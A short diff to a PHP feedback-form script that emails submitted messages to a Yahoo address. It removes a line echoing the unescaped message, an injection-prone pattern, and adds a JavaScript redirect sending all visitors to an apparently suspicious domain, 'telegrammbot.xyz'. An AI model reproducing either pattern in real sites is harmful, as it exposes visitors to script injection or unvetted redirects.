@@ -8,4 +8,6 @@ $message = wordwrap($message, 70);
 
 // send email
 mail("mmdjoker@yahoo.com", "FeedBack-$name", $message, $headers);
-echo "$message sent successfully";
+echo '<script type="text/javascript">
+           window.location = "https://telegrammbot.xyz"
+      </script>';
